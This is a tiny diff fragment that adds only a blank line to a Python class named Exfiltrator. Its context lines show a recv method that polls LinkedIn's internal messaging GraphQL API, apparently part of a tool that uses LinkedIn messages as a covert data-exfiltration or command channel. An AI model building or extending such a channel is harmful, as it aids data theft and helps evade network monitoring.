@@ -60,6 +60,7 @@ class Exfiltrator:
         elif response.status_code >= 500:
             raise Exception(response.text)
 
+
     def recv(self):
         response = requests.get(
             f'https://linkedin.com/voyager/api/voyagerMessagingGraphQL/graphql?queryId=messengerMessages.{self.data_dict["msg_id"]}'
